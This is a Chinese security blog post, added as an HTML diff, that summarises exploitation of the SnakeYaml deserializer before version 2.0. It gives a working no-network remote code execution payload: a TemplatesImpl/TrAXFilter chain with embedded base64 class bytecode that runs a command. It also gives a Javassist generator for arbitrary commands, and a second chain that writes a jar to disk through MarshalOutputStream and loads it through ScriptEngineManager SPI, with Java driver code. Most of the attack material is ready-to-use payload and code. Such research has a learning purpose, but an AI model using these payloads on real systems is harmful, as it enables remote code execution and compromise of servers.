@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            SnakeYaml利用总结 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        SnakeYaml利用总结
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-08-03 16:27:57</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Aug 04 2025 16:06:33 GMT+0800">2025-08-04 16:06:33</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.5k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>12 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SnakeYaml在2.0之前的版本默认不开启安全模式，会自动调用构造方法和setter方法来实例化一个类，因此存在很多反序列化打法。这里总结一下常用的链子，为基于JavaBean机制的反序列化积累知识。</p>
+<h1 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h1><h2 id="JDK原生"><a href="#JDK原生" class="headerlink" title="JDK原生"></a>JDK原生</h2><p>从这篇文章学习：<a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/4486" >奇安信攻防社区-SnakeYaml 不出网 RCE 新链（JDK原生链）挖掘<i class="fas fa-external-link-alt"></i></a></p>
+<p>适用于jdk8，不需要出网，实用性很高，能直接RCE。</p>
+<h3 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h3><p>1、sink</p>
+<p>在CC链中，有一个TrAXFilter类，它的构造方法能够触发newTransformer，从而通过TemplatesImpl触发字节码加载。TemplatesImpl里有几个关键的字段需要赋值，分别是：_bytecodes，_tfactory，_name 。现在让我们看看能不能通过构造方法来为这几个赋值，如果能的话，很可能就能使用SnakeYaml进行反序列化。</p>
+<p>有两个protected构造方法：</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209745014.png"  alt="img"></p>
+<p>上面那个跟进init：</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209745027.png"  alt="img"></p>
+<p>非常巧，我们需要的几个字段都能在构造方法中赋值。</p>
+<p>2、byte[][]如何写入.yml</p>
+<p>byte[] 对应 !!binary xxxxx，但是byte[][]应该怎么写？</p>
+<p>这里直接给出文章中的答案，[!!binary xxxxx]</p>
+<p>可以通过序列化一个有byte[][]字段的对象来观察。</p>
+<p>3、发现报错</p>
+<p>初步的poc：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span> [</span><br><span class="line">  [<span class="type">!!binary</span> <span class="string">SGVsbG8=</span>],</span><br><span class="line">  <span class="string">&quot;heihu577&quot;</span>,</span><br><span class="line">  <span class="type">!!java.util.Properties</span> &#123;&#125;,</span><br><span class="line">  <span class="type">!!int</span> <span class="number">0</span>,</span><br><span class="line">  <span class="type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span> &#123;&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>但是却报错：</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209754236.png"  alt="img"></p>
+<p>说是找不到合适的构造方法。</p>
+<p>我们跟进报错，去调试一下：</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209754229.png"  alt="img"></p>
+<p>上面这张图，首先将参数数量一致的构造方法添加进List，然后进行判断。如果构造方法是唯一的，就会将yaml文件中读取到的数据，全部转换为符合构造函数参数的数据类型。</p>
+<p>下面这张图，在构造方法大于1个时进入。我们目前就属于这种情况。问题出现在isAssignbleFrom。</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209763939.png"  alt="img"></p>
+<p>虽然我们传入的是一个bytes[][]，但是解析后变成了ArrayList，而byte[][]和ArrayList是不满足if的，也就是byte[][] &#x3D; new ArrayList()是不成立的，如下图。所以在这儿会抛出错误。</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209763894.png"  alt="img"></p>
+<p>4、解决报错</p>
+<p>由于TemplatesImpl是硬编码，不能修改的。所以我们只能想办法让传入的byte[][]先从ArrayList转换成byte[][]，再进入if。</p>
+<p>这里运用的方法是先创建引用类型，而后引用。</p>
+<p>这里作者找到了这样一个类 com.sun.javafx.iio.ImageFrame 这个类有两个不同参数的构造方法，且构造方法中有byte[][]类型的参数：</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/attach-ee7cb18e1bd2991de46ddf6e8ee73d151f6ed6ce.png"  alt="img"></p>
+<p>最终payload：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  <span class="type">!!com.sun.javafx.iio.ImageFrame</span> [<span class="literal">null</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&amp;A</span> [<span class="type">!!binary</span> <span class="string">&quot;yv66vgAAADQAXwoAEgA0BwA1CgACADQHADYKADcAOAoAOQA6CgACADsJADwAPQcAPgoACQA/CgBAAEEKAEIAQwgARAoAQgBFBwBGBwBHCgAQAEgHAEkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExjb20vaGVpaHU1NzcvYmVhbi9FdmlsOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZlbmNvZGUBAAJbQgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwBKAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwBGAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwAEwAUAQAqb3JnL2FwYWNoZS90b21jYXQvdXRpbC9jb2RlYy9iaW5hcnkvQmFzZTY0AQAWY29tL2hlaWh1NTc3L2JlYW4vRXZpbAcASwwATABNBwBODABPAFAMAB4AUQcAUgwAUwBUAQAQamF2YS9sYW5nL1N0cmluZwwAEwBVBwBWDABXAFgHAFkMAFoAWwEABGNhbGMMAFwAXQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwAEwBeAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAK2NvbS9zdW4vb3JnL2FwYWNoZS9iY2VsL2ludGVybmFsL1JlcG9zaXRvcnkBAAtsb29rdXBDbGFzcwEASShMamF2YS9sYW5nL0NsYXNzOylMY29tL3N1bi9vcmcvYXBhY2hlL2JjZWwvaW50ZXJuYWwvY2xhc3NmaWxlL0phdmFDbGFzczsBADRjb20vc3VuL29yZy9hcGFjaGUvYmNlbC9pbnRlcm5hbC9jbGFzc2ZpbGUvSmF2YUNsYXNzAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGKFtCKVtCAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEABShbQilWAQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEABAASAAAAAAAFAAEAEwAUAAEAFQAAAC8AAQABAAAABSq3AAGxAAAAAgAWAAAABgABAAAADgAXAAAADAABAAAABQAYABkAAAAJABoAGwABABUAAABeAAQAAgAAACK7AAJZtwADEgS4AAW2AAa2AAdMsgAIuwAJWSu3AAq2AAuxAAAAAgAWAAAADgADAAAAEAATABEAIQASABcAAAAWAAIAAAAiABwAHQAAABMADwAeAB8AAQABACAAIQACABUAAAA/AAAAAwAAAAGxAAAAAgAWAAAABgABAAAAHwAXAAAAIAADAAAAAQAYABkAAAAAAAEAIgAjAAEAAAABACQAJQACACYAAAAEAAEAJwABACAAKAACABUAAABJAAAABAAAAAGxAAAAAgAWAAAABgABAAAAJAAXAAAAKgAEAAAAAQAYABkAAAAAAAEAIgAjAAEAAAABACkAKgACAAAAAQArACwAAwAmAAAABAABACcACAAtABQAAQAVAAAAZgADAAEAAAAXuAAMEg22AA5XpwANS7sAEFkqtwARv7EAAQAAAAkADAAPAAMAFgAAABYABQAAABYACQAZAAwAFwANABgAFgAaABcAAAAMAAEADQAJAC4ALwAAADAAAAAHAAJMBwAxCQABADIAAAACADM=&quot;</span>], <span class="literal">null</span>],</span><br><span class="line">  <span class="type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span> [</span><br><span class="line">    <span class="type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span> [<span class="string">*A</span>,<span class="string">&quot;heihu577&quot;</span>,<span class="type">!!java.util.Properties</span> &#123;&#125;,<span class="type">!!int</span> <span class="number">0</span>,<span class="type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span> &#123;&#125;]</span><br><span class="line">  ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>bytecode生成：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ByteCodeGen</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = genByte(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genByte(String cmd) <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">sink</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Sink&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        sink.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">static_block</span> <span class="operator">=</span> sink.makeClassInitializer();</span><br><span class="line">        static_block.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sink.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>1、找可以利用的构造函数</p>
+<p>2、可以通过&amp; * 引用的方式转换数据格式</p>
+<h2 id="MarshalOutputStream写Jar包-SPI"><a href="#MarshalOutputStream写Jar包-SPI" class="headerlink" title="MarshalOutputStream写Jar包+SPI"></a>MarshalOutputStream写Jar包+SPI</h2><p>yaml用的jar包可以由这个工具生成：<a class="link"   target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload" >GitHub - artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads<i class="fas fa-external-link-alt"></i></a></p>
+<p>先写文件</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!sun.rmi.server.MarshalOutputStream</span> [<span class="type">!!java.util.zip.InflaterOutputStream</span> [<span class="type">!!java.io.FileOutputStream</span> [<span class="type">!!java.io.File</span> [<span class="string">&quot;success.jar&quot;</span>],<span class="literal">false</span>],<span class="type">!!java.util.zip.Inflater</span> &#123; <span class="attr">input:</span> <span class="type">!!binary</span> <span class="string">eJxLLE5JTCkGAAh5AnE=</span> &#125;,<span class="number">1048576</span>]]</span><br></pre></td></tr></table></figure>
+
+<p>再spi触发</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span> [<span class="string">&quot;file:///SnakeYaml/success.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure>
+
+<p>代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Marshal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        marshal(<span class="string">&quot;./poc/yaml-payload.jar&quot;</span>, <span class="string">&quot;success.jar&quot;</span>);</span><br><span class="line">        spi();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">spi</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">spi</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;file:///D:/BaiduSyncdisk/code/MyJavaSecStudy/SnakeYaml/success.jar\&quot;]]]]&quot;</span>;</span><br><span class="line">        yaml.load(spi);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">marshal</span><span class="params">(String filePath, String fileName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line">        <span class="type">byte</span>[] bytes_zip = deflateZip(bytes);</span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes_zip);</span><br><span class="line">        <span class="type">String</span> <span class="variable">marshal</span> <span class="operator">=</span> <span class="string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;&quot;</span>+fileName+<span class="string">&quot;\&quot;],false],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;!!java.util.zip.Inflater &#123; input: !!binary &quot;</span> + file + <span class="string">&quot;&#125;,1048576]]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(marshal);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] deflateZip(<span class="type">byte</span>[] input)&#123;</span><br><span class="line">        <span class="type">Deflater</span> <span class="variable">deflater</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Deflater</span>();</span><br><span class="line">        deflater.setInput(input);</span><br><span class="line">        deflater.finish();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="keyword">while</span> (!deflater.finished()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> deflater.deflate(buf);</span><br><span class="line">            baos.write(buf, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        deflater.end();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="简要分析-1"><a href="#简要分析-1" class="headerlink" title="简要分析"></a>简要分析</h3><p>具体的构造方法自己看一下。这里主要讲在哪里触发文件写入的。</p>
+<p>Marshal的构造方法，这里面out是InflaterOutputStream：</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754236249048.png"  alt="img"></p>
+<p>下面是完整调用过程</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754236260704.png"  alt="img"></p>
